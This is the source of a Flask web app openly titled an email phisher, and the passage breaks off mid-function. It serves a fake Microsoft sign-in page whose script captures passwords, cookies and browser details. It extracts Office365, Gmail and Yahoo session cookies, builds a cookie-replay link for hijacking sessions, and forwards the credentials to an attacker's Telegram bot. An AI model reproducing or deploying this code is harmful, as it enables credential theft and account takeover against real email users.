#!/usr/bin/env python3
"""
UNIVERSAL EMAIL PHISHER - FIXED VERSION
Railway: app.py + Procfile + requirements.txt
"""

import os
import urllib.parse
from datetime import datetime
from flask import Flask, request
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')

PROVIDERS = {
    'office': {'emoji': '🔴', 'name': 'Office365', 'url': 'https://outlook.office.com/mail/inbox', 'cookies': ['ESTSAUTH','ESTSAUTHPERSISTENT','MUID','MSID']},
    'gmail': {'emoji': '🟢', 'name': 'Gmail', 'url': 'https://mail.google.com/mail/u/0/#inbox', 'cookies': ['SID','HSID','SSID','GMAIL_AT']},
    'yahoo': {'emoji': '🟡', 'name': 'Yahoo', 'url': 'https://mail.yahoo.com', 'cookies': ['T','Y']}
}

def send_telegram(msg):
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                         data={'chat_id':TELEGRAM_CHAT_ID, 'text':msg, 'parse_mode':'HTML'})
        except: pass

def detect_provider(email, cookies):
    ck = set(cookies.keys())
    for k, v in PROVIDERS.items():
        if ck.intersection(v['cookies']): return k
    if 'gmail' in email.lower(): return 'gmail'
    if 'yahoo' in email.lower(): return 'yahoo'
    return 'office'

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head>
<title>Microsoft Sign In</title>
<meta name="viewport" content="width=device-width">
<style>
* {margin:0;padding:0;box-sizing:border-box;}
body {background:#f3f2f1;font-family:Segoe UI,Tahoma,sans-serif;}
.login {max-width:400px;margin:100px auto;padding:40px;background:#fff;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,0.1);}
.logo {width:200px;margin:0 auto 30px;display:block;}
h1 {color:#0078d4;font-size:24px;font-weight:400;text-align:center;margin-bottom:25px;}
input {width:100%;padding:14px;margin-bottom:16px;border:1px solid #ddd;border-radius:3px;font-size:16px;}
input:focus {outline:none;border-color:#0078d4;box-shadow:0 0 0 2px rgba(0,120,212,0.2);}
.btn {width:100%;padding:14px;background:#0078d4;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:600;cursor:pointer;}
.btn:hover {background:#106ebe;}
.loading {display:none;text-align:center;color:#666;padding:20px;}
</style>
</head>
<body>
<div class="login">
<img class="logo" src="https://login.microsoftonline.com/common/images/logo.png" alt="Microsoft">
<h1>Sign in to your account</h1>
<form id="loginForm">
<input type="email" id="username" placeholder="Email or phone" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="loading" id="loading"></div>
<script>
document.getElementById('loginForm').onsubmit=async(e)=>{{
e.preventDefault();
const data={{
username:document.getElementById('username').value,
password:document.getElementById('password').value,
cookies:document.cookie,
ua:navigator.userAgent,
screen:`${{screen.width}}x${{screen.height}}`,
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
}};
document.getElementById('loading').style.display='block';
document.querySelector('.login').style.opacity='0.5';
await fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
setTimeout(()=>{{
window.location.href='https://login.microsoftonline.com';
}},3500);
}};
</script>
</body>
</html>'''

@app.route('/harvest', methods=['POST'])
def harvest():
    try:
        data = request.get_json() or {}
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        email = data.get('username', '')
        pwd = data.get('password', '')
        cookies_raw = data.get('cookies', '')
        
        cookies = {}
        for c in cookies_raw.split(';'):
            if '=' in c:
                k, v = c.strip().split('=', 1)
                cookies[k] = v
        
        provider_key = detect_provider(email, cookies)
        provider = PROVIDERS[provider_key]
        
        critical = {k: cookies.get(k, '') for k in provider['cookies']}
        critical = {k:v for k,v in critical.items() if v}
        
        cookie_export = '; '.join([f"{k}={v}" for k,v in critical.items()])
        replay_url = f"https://{request.host}/replay?cookies={urllib.parse.quote(cookie_export)}&target={urllib.parse.quote(provider['url'])}"
        
        tmsg = f"""🔥 <b>{provider['emoji']} EMAIL SESSION!</b> {provider['name']}
👤 <code>{email}</code>
🔑 <code>{pwd}</code>
🍪 <b>{len(critical)} cookies:</b>
